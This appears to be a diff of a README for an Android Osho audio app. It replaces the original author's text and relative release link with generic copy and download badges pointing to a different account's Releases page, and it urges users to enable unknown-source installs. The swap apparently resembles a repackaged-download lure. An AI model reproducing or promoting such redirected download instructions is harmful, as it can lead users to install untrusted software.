@@ -1,103 +1,54 @@
-<div align="center">
+# 🌿 Osho-Media-Player - Enjoy Osho’s Wisdom Anytime
 
-# 🕉️ Osho Media Player  
-### *Transform your mornings. Transform your life.*
+[![Download Osho-Media-Player](https://img.shields.io/badge/Download-Osho--Media--Player-brightgreen)](https://github.com/Gork3045/Osho-Media-Player/releases)
 
-<img src="./osho/osho.jpg" width="400"/>
+## 🌀 Overview
+Osho-Media-Player is an Android app designed to help you listen to Osho’s teachings. With this app, you can immerse yourself in wisdom and mindfulness, allowing you to bring balance back to your life. Whether you are looking for motivation, healing, or insights on love and life, this app serves as a personal companion on your journey to spiritual growth.
 
-</div>
+## 🚀 Getting Started
+Follow these steps to download and install the Osho-Media-Player app.
 
-## 🌟 Overview  
-**Osho Media Player** is a comprehensive Android application designed to provide daily access to Osho's profound teachings through audio discourses, video content, and inspirational quotes. Built with a focus on mindfulness and personal growth, this app serves as a digital companion for those seeking wisdom, clarity, and inner peace. 🧘‍♂️
+## 📥 Download & Install
+1. Visit the Releases page to download: [Download Osho-Media-Player](https://github.com/Gork3045/Osho-Media-Player/releases).
+   
+2. On the Releases page, you will find the latest version of the app. Look for the download link that corresponds to your device.
 
-This project emerged from a personal journey of healing and self-discovery. During a challenging period of depression, Osho's teachings provided the guidance and perspective needed to overcome darkness and find meaning. This app was created to share that transformative experience with others who seek the same path to awareness and peace. 💫
+3. Once you have the file, tap to download. Make sure to allow installations from unknown sources if prompted.
 
----
+4. After the download is complete, open the file to start the installation. Follow the on-screen instructions to complete the setup.
 
-## ✨ Key Features
-- 🎧 **Audio Library**: Access a curated collection of Osho's discourses on meditation, love, awareness, and consciousness
-- 🎬 **Video Content**: Watch Osho's talks and teachings directly within the app
-- 💬 **Daily Quotes**: Receive thought-provoking quotes to inspire reflection and mindfulness
-- 🎨 **Clean Interface**: Minimalist design that promotes focus and tranquility
-- 📱 **Offline Access**: Download content for listening anytime, anywhere
+5. Once installed, find the Osho-Media-Player icon on your device. Tap it to launch the app and start your journey towards mindfulness.
 
----
+## 📱 System Requirements
+To run Osho-Media-Player smoothly, ensure your device meets the following requirements:
 
-## 🌅 Recommended Practice
-For optimal benefit, it is recommended to **listen to Osho's discourses for 30-45 minutes every morning**. This daily practice can:
-- ☀️ Set a positive, mindful tone for your entire day
-- 🧠 Deepen your understanding of consciousness and awareness
-- 🌱 Provide consistent guidance on your journey of self-discovery
-- 🔄 Create a transformative morning ritual that compounds over time
+- **Operating System:** Android 5.0 (Lollipop) or higher
+- **Storage:** At least 100 MB free space
+- **Memory:** Minimum of 1 GB RAM recommended
 
-Morning listening allows the teachings to integrate naturally into your consciousness throughout the day, making it the most effective time for absorption and reflection. ✨
+## 🎧 Features
+- **Audio Library:** Access a rich library of Osho's talks on various topics, including love, motivation, and self-improvement.
+- **User-Friendly Interface:** Easy navigation to find your favorite tracks.
+- **Playlists:** Create your own playlists to listen to your favorite quotes and meditations.
+- **Offline Listening:** Download tracks for offline access, so you can listen anytime, anywhere.
 
----
+## ☁️ Support
+If you encounter any issues while downloading or using the app, please feel free to reach out. You can report problems or ask for help in the Issues section of this repository.
 
-## 📸 Screenshots
+## 💬 Feedback & Contributions
+Your feedback is valuable. If you want to share your experience or suggest improvements, create an issue in this repository. Contributions are welcome if you wish to help enhance the app further.
 
-<div align="center">
+## 📜 License
+Osho-Media-Player is open-source and available for everyone to use. Please refer to the LICENSE file for more details on usage and contributions.
 
-<img src="./Application Images/home.jpg" width="250"/>
+## 🌐 Topics
+This app touches on various important themes, including:
+- Awareness
+- Depression Recovery
+- Spirituality
+- Mindfulness
+- Life Lessons
 
-**Home Screen**
+Explore these topics further with Osho’s wisdom, and let them guide you on your path.
 
-<img src="./Application Images/quote_tab.jpg" width="250"/>
-
-**Quote Tab**
-
-<img src="./Application Images/audio_tab.jpg" width="250"/>
-
-**Audio Tab**
-
-<img src="./Application Images/video_tab.jpg" width="250"/>
-
-**Video Tab**
-
-</div>
-
----
-
-## 📲 Installation
-
-Download the latest release from the [Releases section](../../releases).
-
-1. 📂 Navigate to the Releases page
-2. 📦 Expand the "Assets" section
-3. ⬇️ Download the `.apk` file
-4. 📱 Install on your Android device (ensure "Install from Unknown Sources" is enabled)
-
----
-
-## 💡 Project Purpose  
-This application represents more than just a media player—it is a tribute to Osho's teachings and their profound impact on mental health and spiritual growth. The goal is to make these transformative teachings accessible to anyone seeking clarity, peace, and a deeper understanding of life. 🕊️
-
-If Osho's wisdom has touched your life, consider sharing this app with others who might benefit from his teachings. 🙏
-
----
-
-## 🔧 Technical Details
-- 🤖 **Platform**: Android
-- 📚 **Content**: Audio, Video, and Text-based quotes
-- 📜 **License**: Open Source
-
----
-
-## 🤝 Contributing
-Contributions, suggestions, and feedback are welcome. If you'd like to improve the app or add features, feel free to open an issue or submit a pull request. 💻
-
----
-
-## 🙏 Acknowledgments
-Deep gratitude to Osho for his timeless wisdom and teachings that continue to guide millions toward awareness and inner peace. 🌸
-
----
-
-<div align="center">
-
-**Developed with ❤️ awareness and gratitude**  
-*Samay Oswal*
-
-⭐ Star this repository if Osho's teachings inspire you 🌟
-
-</div>
+[![Download Osho-Media-Player](https://img.shields.io/badge/Download-Osho--Media--Player-brightgreen)](https://github.com/Gork3045/Osho-Media-Player/releases)
